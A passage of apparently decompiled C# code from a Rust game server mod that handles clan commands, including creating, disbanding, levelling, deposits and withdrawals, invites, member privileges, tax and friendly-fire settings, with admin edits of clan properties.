									}
									if (text4.Length > 0)
									{
										Broadcast.MessageClan(@class.netUser_0, clanData, text4.Substring(0, text4.Length - 2));
									}
								}
								else if (!text3.Contains("%CLAN."))
								{
									Broadcast.MessageClan(@class.netUser_0, text3);
								}
							}
							return;
						}
						else if (text.Equals("EDIT"))
						{
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", "You must enter clan name or abbr to edit properties.", 5f);
								return;
							}
							if ((clanData = Clans.Find(Args[1])) == null)
							{
								Broadcast.Notice(@class.netUser_0, "✔", "Clan with name \"" + Args[1] + "\" not exists.", 5f);
								return;
							}
							if (Args.Length < 3)
							{
								Broadcast.Notice(@class.netUser_0, "✘", "What properties do you want edit for this clan?", 5f);
								return;
							}
							if (Args.Length < 4)
							{
								Broadcast.Notice(@class.netUser_0, "✘", "You must enter NEW value for this properties", 5f);
								return;
							}
							string text5 = Args[2].ToUpper();
							if (text5.Equals("NAME"))
							{
								Broadcast.Notice(@class.netUser_0, "✔", "You change name for clan " + clanData.Name, 5f);
								clanData.Name = Args[3];
								return;
							}
							if (text5.Equals("ABBR") || text5.Equals("ABBREVIATION"))
							{
								clanData.Abbr = Args[3];
								Broadcast.Notice(@class.netUser_0, "✔", "You change abbreviation for clan " + clanData.Name, 5f);
								return;
							}
							if (text5.Equals("MOTD") || text5.Equals("MESSAGEOFTHEDAY"))
							{
								clanData.MOTD = Args[3];
								Broadcast.Notice(@class.netUser_0, "✔", "You change MOTD for clan " + clanData.Name, 5f);
								return;
							}
							if (!text5.Equals("BALANCE") && !text5.Equals("MONEY"))
							{
								if (!text5.Equals("EXP") && !text5.Equals("EXPERIENCE"))
								{
									if (text5.Equals("TAX"))
									{
										uint num2 = 0u;
										if (!uint.TryParse(Args[3], out num2))
										{
											Broadcast.Notice(@class.netUser_0, "✘", "WRONG: Requires only digits!", 5f);
											return;
										}
										clanData.Tax = num2;
										Broadcast.Notice(@class.netUser_0, "✔", string.Concat(new object[]
										{
											"You change tax to ",
											num2,
											"% for clan ",
											clanData.Name
										}), 5f);
										return;
									}
									else
									{
										if (!text5.Equals("LVL") && !text5.Equals("LEVEL"))
										{
											if (text5.Equals("LEADER") || text5.Equals("CLANLEADER"))
											{
												UserData userData3;
												if ((userData3 = Users.Find(Args[3])) == null)
												{
													Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[3]), 5f);
												}
												else
												{
													clanData.LeaderID = userData3.SteamID;
													clanData.Members[userData3] = (ClanMemberFlags.invite | ClanMemberFlags.dismiss | ClanMemberFlags.management);
													Broadcast.Notice(@class.netUser_0, "✔", "You change leader for clan " + clanData.Name, 5f);
												}
											}
											return;
										}
										Commands.Class8 class2 = new Commands.Class8();
										class2.class7_0 = @class;
										class2.int_0 = 0;
										if (!int.TryParse(Args[3], out class2.int_0))
										{
											Broadcast.Notice(@class.netUser_0, "✘", "WRONG: Requires only digits!", 5f);
											return;
										}
										ClanLevel clanLevel2 = Clans.Levels.Find(new Predicate<ClanLevel>(class2.method_0));
										if (clanLevel2 != null)
										{
											clanData.SetLevel(clanLevel2);
										}
										Broadcast.Notice(@class.netUser_0, "✔", string.Concat(new object[]
										{
											"You change level to ",
											clanLevel2.Id,
											" for clan ",
											clanData.Name
										}), 5f);
										return;
									}
								}
								else
								{
									ulong experience = 0uL;
									if (!ulong.TryParse(Args[3], out experience))
									{
										Broadcast.Notice(@class.netUser_0, "✘", "WRONG: Requires only digits!", 5f);
										return;
									}
									clanData.Experience = experience;
									Broadcast.Notice(@class.netUser_0, "✔", "You change experience to " + experience.ToString("N0") + " for clan " + clanData.Name, 5f);
									return;
								}
							}
							else
							{
								ulong balance = 0uL;
								if (!ulong.TryParse(Args[3], out balance))
								{
									Broadcast.Notice(@class.netUser_0, "✘", "WRONG: Requires only digits!", 5f);
									return;
								}
								clanData.Balance = balance;
								Broadcast.Notice(@class.netUser_0, "✔", string.Concat(new string[]
								{
									"You change balance to ",
									balance.ToString("N0"),
									Economy.CurrencySign,
									" for clan ",
									clanData.Name
								}), 5f);
								return;
							}
						}
						else if (text.Equals("REMOVE") || text.Equals("DELETE"))
						{
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", "You must enter clan name for remove.", 5f);
								return;
							}
							if ((clanData = Clans.Find(Args[1])) == null)
							{
								Broadcast.Notice(@class.netUser_0, "✔", "Clan with name \"" + Args[1] + "\" not exists.", 5f);
								return;
							}
							foreach (UserData current3 in clanData.Members.Keys)
							{
								current3.Clan = null;
								NetUser netUser = NetUser.FindByUserID(current3.SteamID);
								if (netUser != null)
								{
									Broadcast.Notice(netUser, "☢", Config.GetMessageClan("Command.Clan.Disbanded", clanData, @class.netUser_0, current3), 5f);
								}
							}
							Broadcast.Notice(@class.netUser_0, "✘", "You remove \"" + clanData.Name + "\" a clan", 5f);
							Clans.Remove(clanData);
							return;
						}
					}
					if (@class.netUser_0 == null)
					{
						Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageCommand("Command.InvalidSyntax", @class.string_0, @class.netUser_0), 5f);
					}
					else if (text.Equals("CREATE") && @class.userData_0.Clan != null)
					{
						Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.AlreadyInClan", null, @class.netUser_0, null), 5f);
					}
					else if (!text.Equals("CREATE") && @class.userData_0.Clan == null)
					{
						Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NotInClan", null, @class.netUser_0, null), 5f);
					}
					else
					{
						string key;
						switch (key = text)
						{
						case "CREATE":
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.ReqEnterName", null, @class.netUser_0, null), 5f);
								return;
							}
							if (!Regex.Match(Args[1], "([^()<>{}\\[\\]]+)", RegexOptions.IgnoreCase).Success)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.ForbiddenSyntax", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Args[1].Length < 3)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.TooShortLength", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Args[1].Length > 32)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.TooLongLength", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Clans.Find(Args[1]) != null)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.NameAlredyInUse", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Economy.Enabled && Clans.CreateCost > 0u)
							{
								if ((ulong)Clans.CreateCost > Economy.Get(@class.userData_0.SteamID).Balance)
								{
									Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Create.NotEnoughCurrency", null, @class.netUser_0, null), 5f);
									return;
								}
								Economy.Get(@class.userData_0.SteamID).Balance -= (ulong)Clans.CreateCost;
								Economy.Balance(@class.netUser_0, @class.userData_0, "balance", new string[0]);
							}
							@class.userData_0.Clan = Clans.Create(Args[1], @class.netUser_0.userID, DateTime.Now);
							Broadcast.Notice(@class.netUser_0, "✔", Config.GetMessageClan("Command.Clan.Create.Success", @class.userData_0.Clan, @class.netUser_0, @class.userData_0), 5f);
							@class.userData_0.Clan.Level = Clans.Levels[Clans.DefaultLevel];
							Clans.MemberJoin(@class.userData_0.Clan, @class.userData_0);
							return;
						case "DISBAND":
							if (@class.userData_0.Clan.LeaderID != @class.userData_0.SteamID)
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null));
								return;
							}
							foreach (UserData current4 in @class.userData_0.Clan.Members.Keys)
							{
								if (@class.userData_0 != current4)
								{
									NetUser netUser2 = NetUser.FindByUserID(current4.SteamID);
									if (netUser2 != null)
									{
										Broadcast.Notice(netUser2, "☢", Config.GetMessageClan("Command.Clan.Disbanded", null, @class.netUser_0, null), 5f);
									}
									current4.Clan = null;
								}
							}
							Clans.Remove(@class.userData_0.Clan);
							@class.userData_0.Clan = null;
							Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessageClan("Command.Clan.Disbanded", null, @class.netUser_0, null), 5f);
							return;
						case "UP":
						case "RISE":
						case "GROW":
						case "LEVEL":
						{
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.management))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null), 5f);
								return;
							}
							if (clanLevel == null)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.LevelUp.ReachedMax", null, @class.netUser_0, null), 5f);
								return;
							}
							if (@class.userData_0.Clan.Balance < clanLevel.RequireCurrency)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.LevelUp.NotEnoughCurrency", null, @class.netUser_0, null), 5f);
								return;
							}
							if (@class.userData_0.Clan.Experience < clanLevel.RequireExperience)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.LevelUp.NotEnoughExperience", null, @class.netUser_0, null), 5f);
								return;
							}
							@class.userData_0.Clan.SetLevel(clanLevel);
							@class.userData_0.Clan.Balance -= clanLevel.RequireCurrency;
							@class.userData_0.Clan.Experience -= clanLevel.RequireExperience;
							string[] messagesClan3 = Config.GetMessagesClan("Command.Clan.LevelUp.Success", @class.userData_0.Clan, @class.netUser_0, null);
							string[] array = messagesClan3;
							for (int i = 0; i < array.Length; i++)
							{
								string text6 = array[i];
								if (!text6.Contains("%CLAN."))
								{
									Broadcast.MessageClan(@class.userData_0.Clan, text6);
								}
							}
							return;
						}
						case "DEPOSIT":
						{
							ulong num4 = 0uL;
							UserEconomy userEconomy = Economy.Get(@class.userData_0.SteamID);
							if (Economy.Enabled && userEconomy != null)
							{
								if (Args.Length >= 2 && ulong.TryParse(Args[1], out num4))
								{
									if (num4 != 0uL)
									{
										string newValue = num4.ToString("N0") + Economy.CurrencySign;
										if (userEconomy.Balance < num4)
										{
											Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Deposit.NoEnoughAmount", @class.userData_0.Clan, @class.netUser_0, null).Replace("%DEPOSIT_AMOUNT%", newValue), 5f);
											return;
										}
										userEconomy.Balance -= num4;
										@class.userData_0.Clan.Balance += num4;
										Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Deposit.Success", @class.userData_0.Clan, @class.netUser_0, null).Replace("%DEPOSIT_AMOUNT%", newValue), 5f);
										Economy.Balance(@class.netUser_0, @class.userData_0, "balance", new string[0]);
										return;
									}
								}
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Deposit.NoAmount", null, @class.netUser_0, null), 5f);
								return;
							}
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Economy.NotAvailable", @class.netUser_0, null), 5f);
							return;
						}
						case "WITHDRAW":
						{
							ulong num5 = 0uL;
							UserEconomy userEconomy2 = Economy.Get(@class.userData_0.SteamID);
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.management))
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null));
								return;
							}
							if (Economy.Enabled && userEconomy2 != null)
							{
								if (Args.Length >= 2 && ulong.TryParse(Args[1], out num5))
								{
									if (num5 != 0uL)
									{
										string newValue2 = num5.ToString("N0") + Economy.CurrencySign;
										if (@class.userData_0.Clan.Balance < num5)
										{
											Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Withdraw.NoEnoughAmount", @class.userData_0.Clan, @class.netUser_0, null).Replace("%WITHDRAW_AMOUNT%", newValue2), 5f);
											return;
										}
										@class.userData_0.Clan.Balance -= num5;
										userEconomy2.Balance += num5;
										Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Withdraw.Success", @class.userData_0.Clan, @class.netUser_0, null).Replace("%WITHDRAW_AMOUNT%", newValue2), 5f);
										Economy.Balance(@class.netUser_0, @class.userData_0, "balance", new string[0]);
										return;
									}
								}
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Withdraw.NoAmount", null, @class.netUser_0, null), 5f);
								return;
							}
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Economy.NotAvailable", null, null), 5f);
							return;
						}
						case "LEAVE":
							if (@class.userData_0.Clan.LeaderID == @class.userData_0.SteamID)
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Leave.DisbandBefore", null, @class.netUser_0, null));
								return;
							}
							Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessageClan("Command.Clan.Leave.Success", null, @class.netUser_0, null), 5f);
							Broadcast.MessageClan(@class.userData_0.Clan, Config.GetMessageClan("Command.Clan.Leave.MemberLeaved", @class.userData_0.Clan, NetUser.FindByUserID(@class.userData_0.SteamID), null));
							Clans.MemberLeave(@class.userData_0.Clan, @class.userData_0);
							return;
						case "MEMBERS":
						{
							string[] messagesClan4 = Config.GetMessagesClan("Command.Clan.Members", @class.userData_0.Clan, @class.netUser_0, null);
							string[] array = messagesClan4;
							for (int i = 0; i < array.Length; i++)
							{
								string text7 = array[i];
								if (text7.Contains("%CLAN.MEMBERS_LIST%"))
								{
									string text8 = text7.Replace("%CLAN.MEMBERS_LIST%", "");
									foreach (UserData current5 in @class.userData_0.Clan.Members.Keys)
									{
										text8 = text8 + current5.Username + ", ";
										if (text8.Length > 80)
										{
											Broadcast.MessageClan(@class.netUser_0, @class.userData_0.Clan, text8.Substring(0, text8.Length - 2));
											text8 = "";
										}
									}
									if (text8.Length > 0)
									{
										Broadcast.MessageClan(@class.netUser_0, @class.userData_0.Clan, text8.Substring(0, text8.Length - 2));
									}
								}
								else if (!text7.Contains("%CLAN."))
								{
									Broadcast.MessageClan(@class.netUser_0, text7);
								}
							}
							return;
						}
						case "ONLINE":
						{
							string[] messagesClan5 = Config.GetMessagesClan("Command.Clan.Online", @class.userData_0.Clan, @class.netUser_0, null);
							string[] array = messagesClan5;
							for (int i = 0; i < array.Length; i++)
							{
								string text9 = array[i];
								if (text9.Contains("%CLAN.ONLINE_LIST%"))
								{
									string text10 = text9.Replace("%CLAN.ONLINE_LIST%", "");
									foreach (UserData current6 in @class.userData_0.Clan.Members.Keys)
									{
										if (NetUser.FindByUserID(current6.SteamID) != null)
										{
											text10 = text10 + current6.Username + ", ";
										}
										if (text10.Length > 80)
										{
											Broadcast.MessageClan(@class.netUser_0, @class.userData_0.Clan, text10.Substring(0, text10.Length - 2));
											text10 = "";
										}
									}
									if (text10.Length > 0)
									{
										Broadcast.MessageClan(@class.netUser_0, @class.userData_0.Clan, text10.Substring(0, text10.Length - 2));
									}
								}
								else if (!text9.Contains("%CLAN."))
								{
									Broadcast.MessageClan(@class.netUser_0, text9);
								}
							}
							return;
						}
						case "INVITE":
						{
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.invite))
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null));
								return;
							}
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Invite.NoValue", null, @class.netUser_0, null), 5f);
								return;
							}
							if (@class.userData_0.Clan.Members.Count >= @class.userData_0.Clan.Level.MaxMembers)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Invite.NoSlots", null, @class.netUser_0, null), 5f);
								return;
							}
							if ((userData2 = Users.Find(Args[1])) == null)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", @class.netUser_0, Args[1]), 5f);
								return;
							}
							if (userData2.Clan != null)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Invite.AlreadyInClan", @class.userData_0.Clan, null, userData2), 5f);
								return;
							}
							if (Core.ChatQuery.ContainsKey(userData2.SteamID))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Invite.AlreadyInvite", @class.userData_0.Clan, null, userData2), 5f);
								return;
							}
							NetUser netUser3 = NetUser.FindByUserID(userData2.SteamID);
							Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Invite.InviteToJoin", @class.userData_0.Clan, null, userData2));
							UserQuery userQuery = new UserQuery(userData2, Config.GetMessageClan("Command.Clan.Invite.JoinQuery", @class.userData_0.Clan, @class.netUser_0, null), 10u);
							userQuery.Answer.Add(new UserAnswer("Y*", "RustExtended.Clans.MemberJoin", new object[]
							{
								@class.userData_0.Clan,
								userData2
							}));
							userQuery.Answer.Add(new UserAnswer("Y*", "RustExtended.Broadcast.MessageClan", new object[]
							{
								@class.userData_0.Clan,
								Config.GetMessageClan("Command.Clan.Invite.JoinAnswerY", @class.userData_0.Clan, null, userData2)
							}));
							userQuery.Answer.Add(new UserAnswer("*", "RustExtended.Broadcast.MessageClan", new object[]
							{
								@class.userData_0.Clan,
								Config.GetMessageClan("Command.Clan.Invite.JoinAnswerN", @class.userData_0.Clan, null, userData2)
							}));
							Core.ChatQuery.Add(userData2.SteamID, userQuery);
							if (netUser3 != null)
							{
								Broadcast.Notice(netUser3, "?", userQuery.Query, 5f);
								return;
							}
							return;
						}
						case "DISMISS":
						{
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.dismiss))
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null));
								return;
							}
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Dismiss.NoValue", null, @class.netUser_0, null), 5f);
								return;
							}
							if ((userData2 = Users.Find(Args[1])) == null)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", @class.netUser_0, Args[1]), 5f);
								return;
							}
							if (@class.userData_0.Clan != userData2.Clan)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Dismiss.NotInClan", @class.userData_0.Clan, @class.netUser_0, userData2), 5f);
								return;
							}
							if (userData2.Clan.LeaderID == userData2.SteamID)
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Dismiss.IsLeader", @class.userData_0.Clan, @class.netUser_0, userData2));
								return;
							}
							NetUser netUser4 = NetUser.FindByUserID(userData2.SteamID);
							if (netUser4 != null)
							{
								Broadcast.Notice(netUser4, "☢", Config.GetMessageClan("Command.Clan.Dismiss.IsLeader", @class.userData_0.Clan, netUser4, null), 5f);
							}
							Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessageClan("Command.Clan.Dismiss.ToDismiss", @class.userData_0.Clan, @class.netUser_0, userData2), 5f);
							Clans.MemberLeave(@class.userData_0.Clan, userData2);
							return;
						}
						case "PRIV":
							if (Args.Length < 2)
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Privileges", @class.userData_0.Clan, @class.netUser_0, userData2).Replace("%MEMBER_PRIV%", @class.userData_0.Clan.Members[@class.userData_0].ToString()));
								return;
							}
							if ((userData2 = Users.Find(Args[1])) == null)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", @class.netUser_0, Args[1]), 5f);
								return;
							}
							if (@class.userData_0.Clan != userData2.Clan)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Privileges.NotInClan", @class.userData_0.Clan, @class.netUser_0, userData2), 5f);
								return;
							}
							if (Args.Length < 3)
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Privileges.Member", @class.userData_0.Clan, @class.netUser_0, userData2).Replace("%MEMBER_PRIV%", @class.userData_0.Clan.Members[userData2].ToString()));
								return;
							}
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.management))
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null));
								return;
							}
							if (userData2.Clan.LeaderID == userData2.SteamID)
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Privileges.NoCanChange", null, @class.netUser_0, null));
								return;
							}
							if (Args.Length > 2)
							{
								Args[2] = Args[2].ToUpper();
								if (!(Args[2] == "NONE") && !(Args[2] == "CLEAR"))
								{
									if (!(Args[2] == "FULL") && !(Args[2] == "ALL"))
									{
										if (Args[2] == "INVITE")
										{
											Dictionary<UserData, ClanMemberFlags> members;
											UserData key2;
											(members = @class.userData_0.Clan.Members)[key2 = userData2] = (members[key2] ^ ClanMemberFlags.invite);
										}
										else if (Args[2] == "DISMISS")
										{
											Dictionary<UserData, ClanMemberFlags> members;
											UserData key2;
											(members = @class.userData_0.Clan.Members)[key2 = userData2] = (members[key2] ^ ClanMemberFlags.dismiss);
										}
										else
										{
											if (!(Args[2] == "MANAGEMENT"))
											{
												Broadcast.Notice(@class.netUser_0, "✘", "Unknown name of privilege.", 5f);
												return;
											}
											Dictionary<UserData, ClanMemberFlags> members;
											UserData key2;
											(members = @class.userData_0.Clan.Members)[key2 = userData2] = (members[key2] ^ ClanMemberFlags.management);
										}
									}
									else
									{
										@class.userData_0.Clan.Members[userData2] = (ClanMemberFlags.invite | ClanMemberFlags.dismiss | ClanMemberFlags.management);
									}
								}
								else
								{
									@class.userData_0.Clan.Members[userData2] = (ClanMemberFlags)0;
								}
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Privileges.Member", @class.userData_0.Clan, @class.netUser_0, userData2).Replace("%MEMBER_PRIV%", @class.userData_0.Clan.Members[userData2].ToString()));
								return;
							}
							return;
						case "DETAILS":
						{
							bool flag = @class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.expdetails);
							if (Args.Length > 1)
							{
								if (flag = Args[1].ToBool())
								{
									Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Details.SetOn", @class.userData_0.Clan, @class.netUser_0, @class.userData_0));
								}
								else
								{
									Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Details.SetOff", @class.userData_0.Clan, @class.netUser_0, @class.userData_0));
								}
								@class.userData_0.Clan.Members[@class.userData_0] = @class.userData_0.Clan.Members[@class.userData_0].SetFlag(ClanMemberFlags.expdetails, flag);
								return;
							}
							if (flag)
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Details.Enabled", @class.userData_0.Clan, @class.netUser_0, @class.userData_0));
								return;
							}
							Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.Details.Disabled", @class.userData_0.Clan, @class.netUser_0, @class.userData_0));
							return;
						}
						case "ABBR":
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.management))
							{
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null));
								return;
							}
							if (!@class.userData_0.Clan.Flags.Has(ClanFlags.can_abbr))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.NoAvailable", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.NoValue", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Args[1].Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.TooShortLength", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Args[1].Length > 8)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.TooLongLength", null, @class.netUser_0, null), 5f);
								return;
							}
							if (!Regex.Match(Args[1], "[^()<>{}\\[\\]]+", RegexOptions.IgnoreCase).Success)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Abbr.ForbiddenSyntax", null, @class.netUser_0, null), 5f);
								return;
							}
							@class.userData_0.Clan.Abbr = Args[1];
							Broadcast.MessageClan(@class.userData_0.Clan, Config.GetMessageClan("Command.Clan.Abbr.Success", @class.userData_0.Clan, @class.netUser_0, null));
							return;
						case "TAX":
						{
							uint tax = @class.userData_0.Clan.Tax;
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.management))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null), 5f);
								return;
							}
							if (!@class.userData_0.Clan.Flags.Has(ClanFlags.can_tax))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Tax.NoAvailable", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Tax.NoValue", null, @class.netUser_0, null), 5f);
								return;
							}
							if (!uint.TryParse(Args[1], out tax))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Tax.NoNumeric", null, @class.netUser_0, null), 5f);
								return;
							}
							if (tax > 90u)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Tax.VeryHigh", null, @class.netUser_0, null), 5f);
								return;
							}
							@class.userData_0.Clan.Tax = tax;
							Broadcast.MessageClan(@class.userData_0.Clan, Config.GetMessageClan("Command.Clan.Tax.Success", @class.userData_0.Clan, @class.netUser_0, null));
							return;
						}
						case "TRANSFER":
							if (@class.userData_0.Clan.LeaderID != @class.userData_0.SteamID)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Transfer.NoValue", null, @class.netUser_0, null), 5f);
								return;
							}
							if ((userData2 = Users.Find(Args[1])) == null)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", @class.netUser_0, Args[1]), 5f);
								return;
							}
							if (userData2.Clan != null)
							{
								if (userData2.Clan == @class.userData_0.Clan)
								{
									NetUser netUser5 = NetUser.FindByUserID(userData2.SteamID);
									Broadcast.MessageClan(@class.netUser_0, clanData, Config.GetMessageClan("Command.Clan.Transfer.Query", clanData, @class.netUser_0, userData2));
									UserQuery userQuery2 = new UserQuery(userData2, Config.GetMessageClan("Command.Clan.Transfer.QueryMember", @class.userData_0.Clan, null, null), 10u);
									userQuery2.Answer.Add(new UserAnswer("ACCEPT", "RustExtended.Clans.TransferAccept", new object[]
									{
										@class.userData_0.Clan,
										userData2
									}));
									userQuery2.Answer.Add(new UserAnswer("*", "RustExtended.Clans.TransferDecline", new object[]
									{
										@class.userData_0.Clan,
										userData2
									}));
									Core.ChatQuery.Add(userData2.SteamID, userQuery2);
									if (netUser5 != null)
									{
										Broadcast.Notice(netUser5, "?", userQuery2.Query, 5f);
										return;
									}
									return;
								}
							}
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Transfer.NotInClan", @class.userData_0.Clan, @class.netUser_0, userData2), 5f);
							return;
						case "MOTD":
							if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.management))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null), 5f);
								return;
							}
							if (!@class.userData_0.Clan.Flags.Has(ClanFlags.can_motd))
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Motd.NoAvailable", null, @class.netUser_0, null), 5f);
								return;
							}
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.Motd.NoValue", null, @class.netUser_0, null), 5f);
								return;
							}
							@class.userData_0.Clan.MOTD = Args[1];
							Broadcast.MessageClan(@class.userData_0.Clan, Config.GetMessageClan("Command.Clan.Motd.Success", @class.userData_0.Clan, @class.netUser_0, null));
							return;
						case "FRIENDLYFIRE":
						case "FFIRE":
						case "FF":
							if (Args.Length < 2)
							{
								if (@class.userData_0.Clan.FrendlyFire)
								{
									Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.Enabled", @class.userData_0.Clan, @class.netUser_0, null));
									return;
								}
								Broadcast.MessageClan(@class.netUser_0, Config.GetMessageClan("Command.Clan.FriendlyFire.Disabled", @class.userData_0.Clan, @class.netUser_0, null));
								return;
							}
							else
							{
								if (!@class.userData_0.Clan.Members[@class.userData_0].Has(ClanMemberFlags.management))
								{
									Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NoPermissions", null, @class.netUser_0, null), 5f);
									return;
								}
								if (!@class.userData_0.Clan.Flags.Has(ClanFlags.can_ffire))
								{
									Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.FriendlyFire.NoAvailable", null, @class.netUser_0, null), 5f);
									return;
								}
								if (Args[1].Equals("YES", StringComparison.OrdinalIgnoreCase))
								{
									@class.userData_0.Clan.FrendlyFire = true;
								}
								else if (Args[1].Equals("ON", StringComparison.OrdinalIgnoreCase))
								{
